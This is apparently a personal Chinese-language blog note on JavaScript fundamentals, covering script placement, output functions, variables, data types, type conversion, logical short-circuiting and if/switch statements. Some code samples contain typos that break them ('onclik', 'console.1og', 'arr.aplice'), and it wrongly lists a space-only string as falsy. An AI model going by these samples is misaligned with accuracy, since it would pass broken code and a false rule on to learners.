        <content type="html"><![CDATA[<p>本文为个人在学习JS过程中记录的笔记，主要基于 <a href="https://www.bilibili.com/video/BV1Y84y1L7Nn">黑马程序员前端JavaScript入门到精通</a> 视频和 <a href="https://www.runoob.com/js">JavaScript | 菜鸟教程</a> 进行学习。</p><p>目前暂时学习完视频P99，后续有机会再进行学习更新</p><h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><ol><li><p><strong>定义</strong>：javascript是一种执行在客户端的脚本语言，不需要编译，在运行过程中由js解释器（js引擎）来逐行进行解释并执行</p><ul><li>常见的js引擎，如chrome使用的v8引擎等</li><li>虽然javascript最初是用于前端开发，但是现在已经可以用于多种开发，如node.js就是内置了v8引擎，使得js脚本可以在浏览器之外的环境下运行，用于编写服务端代码等。</li></ul></li><li><p><strong>JS 的作用</strong>：</p><ul><li><p>表单动态校验 (密码强度检测) ( <strong>JS 产生最初的目的</strong>)</p><blockquote><p>比如一个表单字段的输入并不符合规范，如果需要发给服务端，服务端收到之后判断发现并不合规，再返回就会产生比较大的延迟</p></blockquote></li><li><p>网页特效</p></li><li><p>服务端开发（Node.js）</p></li><li><p>桌面程序（Electron）</p></li><li><p>App（Cordova）</p></li><li><p>控制硬件-物联网（Ruff）</p></li><li><p>游戏开发（cocos2d-js）</p></li></ul></li><li><p><strong>浏览器如何执行JS</strong></p><p>浏览器分成两部分：渲染引擎和JS引擎</p><ul><li>渲染引擎（内核）：用来<u>解析HTML与CSS</u> ，比如chrome浏览器的blink ,老版本的webkit</li><li>JS引擎（JS解释器）：用来读取网页中的JS代码，逐行解释源码并将其转化为机器语言由计算机执行。比如chrome浏览器的V8</li></ul></li><li><p><strong>JS的三部分组成</strong></p><ul><li>核心（ECMAScript）：即JS语法</li><li>Web APIs：即通过JS去操作html和浏览器<ul><li>文档对象模型（Document Object Model，简称DOM） ：通过DOM提供的接口可以对页面上的各种元素进行操作(大小、位置、颜色等)。</li><li>浏览器对象模型（Browser Object Model，简称BOM）：提供了独立于内容的、可以与浏览器窗进行互动的对象结构。通过BOM可以操作浏览器窗口，比如弹出框、控制浏览器跳转、获取分辨率等。</li></ul></li></ul></li><li><p><strong>JS的书写位置</strong></p></li></ol><p>（1）<strong>内部 javascript</strong></p><p>Javascript 脚本代码可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和  <code>&lt;head&gt;</code>  部分中。</p><ul><li><p>写在 <code>&lt;head&gt;</code>  部分中的js脚本<u>在页面内容加载之前被加载和执行</u></p><ul><li>这对于需要在页面加载之前进行的一些初始化操作非常有用，例如预加载某些数据或设置全局变量。</li><li>由于脚本在页面内容加载之前执行，如果脚本执行时间较长，可能会导致页面加载变慢，影响用户体验。</li><li>如果脚本需要操作 DOM 元素，而这些元素尚未加载完成，可能会导致错误。</li></ul></li><li><p>写在 <code>&lt;body&gt;</code> 部分的js脚本在页面内容加载完成后执行</p><ul><li><p>可以直接写到元素的内部，不需要使用script标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;唐伯虎&quot;</span> <span class="attr">onclik</span>=<span class="string">&quot;alert(&#x27;秋香&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者写在body的尾部，使用 <code>script</code> 标签</p></li><li><p>所有 DOM 元素都已经可以被操作，从而避免了在操作 DOM 时遇到的错误。</p></li><li><p>可以在页面加载后执行一些需要立即生效的脚本，例如初始化页面内容或绑定事件处理程序。</p></li><li><p>在 <code>&lt;body&gt;</code> 部分放置大量脚本代码可能会导致 HTML 文件过于冗长，影响代码的可读性和可维护性。</p></li></ul></li></ul><blockquote><p>如果脚本不依赖于页面内容，可以放在 <code>&lt;head&gt;</code> 部分，以便尽早加载和执行。</p><p>如果脚本需要操作页面中的 DOM 元素，通常放在 <code>&lt;body&gt;</code> 部分，或者放在 <code>&lt;body&gt;</code> 底部，以确保页面内容已经完全加载。</p></blockquote><p>（2）<strong>外部 javascript</strong></p><p>可以引入外部 JavaScript 文件，外部文件通常包含被多个网页使用的代码。可以实现 HTML 和 JavaScript 的分离，提高代码的可读性和可维护性。使用 <code>&lt;script&gt;</code> 标签中的 src 属性来标注 js 文件的位置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意使用外部加载js的时候，script标签中间不能写代码</span></span><br><span class="line">&lt;script src=<span class="string">&quot;my.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li><strong>JS代码执行顺序</strong><ul><li>按HTML文档流顺序执行JavaScript代码</li><li>alert()和prompt()它们会跳过页面渲染先被执行</li></ul></li></ol><h1 id="基础语法"><a class="markdownIt-Anchor" href="#基础语法"></a> 基础语法</h1><h2 id="输入和输出"><a class="markdownIt-Anchor" href="#输入和输出"></a> 输入和输出</h2><ol><li><p><strong>输出语法</strong></p><p>（1）document.write</p><p>向body内输出内容，如果输出的内容为标签，会被解析成网页元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;我是div标签&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;h1&gt;我是标题&lt;/h1&gt;&#x27;</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>（2）alert</p><p>页面弹出警告窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="number">5</span> + <span class="number">6</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>（3）console.log</p><p>控制台输出（页面中并没有效果），用于程序员的调试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>输入语法</strong></p><p>（1）prompt</p><p>显示一个对话框，对话框中包含一条文字信息，用来提示用户输入文字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">prompt</span>(<span class="string">&#x27;输入你的年龄：&#x27;</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="变量和常量"><a class="markdownIt-Anchor" href="#变量和常量"></a> 变量和常量</h2><ol><li><p><strong>变量</strong></p><p>初始化（声明+赋值）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">18</span>,username = <span class="string">&#x27;isoda&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>注意一条语句中声明的多个变量不可以同时赋同一个值:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这种声明方法是错误的，定义了x,y为undefined，z为1。</span></span><br><span class="line"><span class="keyword">let</span> x,y,z=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>旧版本使用 <code>var</code> 来定义变量，目前的版本都使用 <code>let</code> 来进行定义</p><p>var 相比 let 存在很多的缺点：</p><ul><li>可以先使用在声明（打印出来为undefined），不合理</li><li>var声明过的变量可以多次重复声明，不合理</li><li>比如变量提升、全局变量、没有块级作用域等等</li></ul></li></ul></li><li><p><strong>常量</strong></p><p><u>声明的时候必须初始化</u>，且不允许重新赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.141592653589793</span>;</span><br><span class="line"><span class="variable constant_">PI</span> = <span class="number">3.14</span>;      <span class="comment">// 报错</span></span><br><span class="line"><span class="variable constant_">PI</span> = <span class="variable constant_">PI</span> + <span class="number">10</span>;   <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li></ol><blockquote><p>在开发的时候：</p><ul><li>基本数据类型：推荐先定义数据为常量const，后续发现这个数据需要修改再改为变量let</li><li>对象数据类型：定义对象为const<ul><li>仍然可以追加对象中的元素，因为对象数据类型存储的是指向对象的地址，虽然对象变了但是地址没有改变</li><li>不能将其指向新的对象，这样地址就产生了改变</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;blue&#x27;</span>]</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="string">&#x27;blue&#x27;</span>)<span class="comment">//没有报错</span></span><br><span class="line">arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]<span class="comment">//产生报错</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型"></a> 数据类型</h2><ol><li><p><strong>数据类型分类</strong></p><p>主要可以分成两大类</p><ul><li><strong>值类型(基本类型)</strong>：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol。</li><li><strong>引用数据类型（对象类型）</strong>：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date）。</li></ul><blockquote><p>这两种类型的区别可见编程基础.计算机基础知识.堆栈</p></blockquote></li><li><p><strong>基本数据类型</strong></p><p><strong>1）字符串</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let answer = &quot;He is called &#x27;Johnny&#x27;&quot;;</span><br><span class="line">let answer = &#x27;He is called &quot;Johnny&quot;&#x27;;</span><br></pre></td></tr></table></figure><ul><li><p><u>字符串拼接</u>：通过 <code>+</code> 运算符，或者反引号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 通过 + 运算符</span></span><br><span class="line"><span class="keyword">let</span> age = <span class="number">15</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;我今年&quot;</span>+age+<span class="string">&quot;岁了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 通过 `` 号</span></span><br><span class="line"><span class="keyword">let</span> age = <span class="number">15</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`我今年<span class="subst">$&#123;age&#125;</span>岁了`</span>)</span><br></pre></td></tr></table></figure></li></ul><p><strong>2）数字</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x1 = <span class="number">34.00</span>      <span class="comment">//使用小数点来写</span></span><br><span class="line"><span class="keyword">let</span> x2 = <span class="number">34</span>                 <span class="comment">//不使用小数点来写</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="number">123e5</span>          <span class="comment">// 12300000</span></span><br></pre></td></tr></table></figure><p><strong>3）布尔</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="literal">true</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="literal">false</span></span><br></pre></td></tr></table></figure><p><strong>4）空（null）</strong></p><p>null表示赋值了，但是内容为空。一般作为尚未创建的对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="literal">null</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br></pre></td></tr></table></figure><blockquote><p>注意 undefined 和 null 的区别</p><p>null表示空，加上1的话就表示1了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>,<span class="title function_">log</span>(<span class="literal">undefined</span> + <span class="number">1</span>) <span class="comment">//NaN</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>+<span class="number">1</span>)<span class="comment">//1</span></span><br></pre></td></tr></table></figure></blockquote><p><strong>5）未定义（Undefined）</strong></p><p>声明了的对象未赋值，打印出来就是Undefined</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br></pre></td></tr></table></figure><p><strong>6）数组</strong></p><p>javascript中列表和数组是一个概念， 没有区别</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">let</span> cars = [<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>]</span><br><span class="line">   <span class="keyword">let</span> myCars = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br><span class="line">   <span class="keyword">let</span> myCars=<span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 数组的操作</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(cars[<span class="number">0</span>],cars[<span class="number">2</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cars.<span class="property">length</span>)</span><br></pre></td></tr></table></figure><ul><li><p>数组添加新数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// push()方法将一个或多个元素添加到数组末尾，返回数组的新长度</span></span><br><span class="line"> length = arr.<span class="title function_">push</span>(a,b,c)</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// unshift()方法将一个或多个元素添加到数组开头，返回数组的新长度</span></span><br><span class="line">length = arr.<span class="title function_">unshift</span>(a,b,c)</span><br></pre></td></tr></table></figure></li><li><p>数组删除数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pop()方法从数组中删除最后一个元素，并返回该元素的值</span></span><br><span class="line">delete_data = arr.<span class="title function_">pop</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// shift()方法从数组中删除第一个元素，并返回该元素的值</span></span><br><span class="line">delete_data = arr.<span class="title function_">shift</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// splice()方法从start位置开始删除掉deletCount个元素</span></span><br><span class="line">arr.<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"> arr.<span class="title function_">aplice</span>(<span class="number">1</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>检测数据类型</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> x</span><br></pre></td></tr></table></figure></li><li><p><strong>数据类型转换</strong></p><ul><li><p><strong>为什么需要数据类型转换：</strong></p><p>表单、prompt获取到的数据默认是字符串类型的，当做数字类型等会产生错误</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;10000&#x27;</span>+<span class="string">&#x27;2000&#x27;</span>) <span class="comment">// 输出结果 100002000</span></span><br></pre></td></tr></table></figure></li><li><p><strong>隐式转换</strong></p><p>某些运算符被执行时，系统内部自动将数据类型进行转换，这种转换称为隐式转换。</p><ul><li><code>+</code> 号两边只要有一个是字符串,都会把另外一个转成字符串</li><li>除了 <code>+</code> 以外的算术运算符，比如 <code>- * /</code> 等都会把数据转成数字类型</li><li><code>+</code> 号作为正号解析可以转换成数字型</li><li>任何数据和字符串<u>相加</u>，都视作字符串拼接，结果都是字符串</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span> + <span class="number">1</span>)<span class="comment">//2</span></span><br><span class="line"><span class="variable language_">console</span>. <span class="title function_">log</span>(<span class="string">&#x27;pink&#x27;</span> + <span class="number">1</span>)<span class="comment">//pink1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span> + <span class="string">&#x27;2&#x27;</span>) <span class="comment">//22</span></span><br><span class="line"><span class="variable language_">console</span>.1og(<span class="number">2</span> - <span class="number">2</span>)<span class="comment">//0</span></span><br><span class="line"><span class="variable language_">console</span>.1og(<span class="number">2</span> - <span class="string">&#x27;2&#x27;</span>) <span class="comment">//0</span></span><br><span class="line"><span class="variable language_">console</span>.1og(+<span class="string">&#x27;123&#x27;</span>) <span class="comment">//可以看作正负号，将字符串转化为数字型</span></span><br></pre></td></tr></table></figure></li><li><p><strong>显示转换</strong></p><p>编写程序时过度依靠系统内部的隐式转换是不严禁的，因为隐式转换规律并不清晰，大多是靠经验总结的规律。为了避免因隐式转换带来的问题，通常需要对数据进行显示转换。</p><p>即：自己写代码告诉系统该转成什么类型</p></li><li><p><strong>常见的数据类型转换方法</strong></p><p><strong>1）字符串转换数字</strong></p><ul><li><p>Number()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Number</span>(<span class="string">&quot;3.14&quot;</span>)    <span class="comment">// 返回 3.14</span></span><br><span class="line"><span class="title class_">Number</span>(<span class="string">&quot; &quot;</span>)       <span class="comment">// 空字符串返回 0 </span></span><br><span class="line"><span class="title class_">Number</span>(<span class="string">&quot;&quot;</span>)        <span class="comment">// 空字符串返回 0</span></span><br><span class="line"><span class="title class_">Number</span>(<span class="string">&quot;12px&quot;</span>)   <span class="comment">// 其他非纯数字字符串返回 NaN</span></span><br></pre></td></tr></table></figure></li><li><p>parseInt()：只保留整数部分</p><p>注意parseInt()和parseFloat()中字符串的开头必须是数字，不然都会返回NaN</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&quot;12px&quot;</span>)   <span class="comment">// 返回12</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&quot;12.13&quot;</span>)   <span class="comment">// 返回12</span></span><br></pre></td></tr></table></figure><blockquote><p>注意这里和上面Number处理非纯数字字符串的区别，这里会直接过滤掉字符部分</p></blockquote></li><li><p>parseFloat()：保留小数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&quot;12px&quot;</span>)   <span class="comment">// 返回12</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&quot;12.13px&quot;</span>)   <span class="comment">// 返回12.13</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>2）数字转换字符串</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用String</span></span><br><span class="line"><span class="title class_">String</span>(x)         <span class="comment">// 将变量 x 转换为字符串并返回</span></span><br><span class="line"><span class="title class_">String</span>(<span class="number">123</span>)       <span class="comment">// 将数字 123 转换为字符串并返回</span></span><br><span class="line"><span class="title class_">String</span>(<span class="number">100</span> + <span class="number">23</span>)  <span class="comment">// 将数字表达式转换为字符串并返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用toString()</span></span><br><span class="line">x.<span class="title function_">toString</span>()</span><br><span class="line">(<span class="number">123</span>).<span class="title function_">toString</span>()</span><br><span class="line">(<span class="number">100</span> + <span class="number">23</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><strong>3）转换为布尔值</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Boolean</span>(a)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>数据类型存储方式</strong></p><ul><li><p>基本数据类型的存储：存储的是数据的值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num1 = <span class="number">10</span></span><br><span class="line"><span class="keyword">let</span> num2 = num1</span><br><span class="line">num = <span class="number">20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num1)<span class="comment">//输出为10</span></span><br></pre></td></tr></table></figure></li><li><p>对象数据类型的存储：存储的是地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1 = &#123;</span><br><span class="line">    <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = obj1</span><br><span class="line">obj2.<span class="property">age</span> = <span class="number">20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1.<span class="property">age</span>)<span class="comment">//输出为20</span></span><br></pre></td></tr></table></figure><blockquote><p>因为obj2中存储的是和obj1相同的地址，所以修改obj2映射到堆中的对象值后，obj1也是映射到这个地址，所以obj1的结果也产生了改变</p></blockquote></li></ul></li></ol><h2 id="运算符"><a class="markdownIt-Anchor" href="#运算符"></a> 运算符</h2><ol><li><p><strong>运算符的优先级</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240714171016207.png" alt="image-20240714171016207" /></p><ul><li><p><code>===</code> 判断值和类型是否完全相同，返回值为 boolean</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为 === 优先级高，先计算得到值相同类型不同，返回false</span></span><br><span class="line"><span class="keyword">let</span> c = <span class="number">2</span> === <span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c)<span class="comment">// 输出为false</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>逻辑中断</strong></p><p><strong>1）原理</strong>：当有多个表达式（值）时，左边表达式的值可以确定时，就不再继续运算右边表达式的值。</p><blockquote><p><code>0</code>、<code>&quot; &quot; （空字符串）</code>、<code>' '（空字符串）</code>、<code>null（空值）</code>、<code>undefined（未定义）</code>、<code>NaN（非数值）</code>都表示为<code>false</code>，除这些之外的为true。</p></blockquote><p>例如：这里因为123为真，所以直接返回123，右边的num++并没有执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="number">123</span> || num++);  <span class="comment">//逻辑中断，返回值123，之后的代码不再继续运行</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(num);<span class="comment">//num的值仍为0</span></span><br></pre></td></tr></table></figure><p><strong>2）逻辑与</strong></p><ul><li>如果第一个表达式的值为真，则返回表达式2</li><li>如果第一个表达式的值为假，则返回表达式1</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>&lt;<span class="number">3</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">undefined</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//null</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//0，因为0是看作假的</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">10</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//20</span></span><br></pre></td></tr></table></figure><p><strong>3）逻辑或</strong></p><ul><li>如果第一个表达式的值为真，则返回表达式1</li><li>如果第一个表达式的值为假，则返回表达式2</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="number">123</span> || <span class="number">456</span> );         <span class="comment">//  123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="number">0</span> ||  <span class="number">456</span> );          <span class="comment">//  456</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="number">123</span> || <span class="number">456</span> || <span class="number">789</span> );  <span class="comment">//  123</span></span><br></pre></td></tr></table></figure></li><li><p><strong>展开运算符</strong></p><p>展开运算符可以将一个对象展开成多个键值对。例如，<code>...&#123; a: 1, b: 2 &#125;</code> 展开为 <code>a: 1, b: 2</code>。</p></li></ol><h2 id="语句"><a class="markdownIt-Anchor" href="#语句"></a> 语句</h2><ol><li><p><strong>分支语句</strong></p><p>分支语句可以让我们有选择性的执行想要的代码</p><p><strong>1）if分支语句</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (time&lt;<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;b&gt;早上好&lt;/b&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (time&gt;=<span class="number">10</span> &amp;&amp; time&lt;<span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;b&gt;今天好&lt;/b&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;b&gt;晚上好!&lt;/b&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2）三元运算符</strong></p><p>语法：条件**?<strong>代码1（满足条件执行的代码）</strong>😗*代码2:（不满足条件执行的代码）</p><p>一般用于赋值</p><p><strong>3）switch语句</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 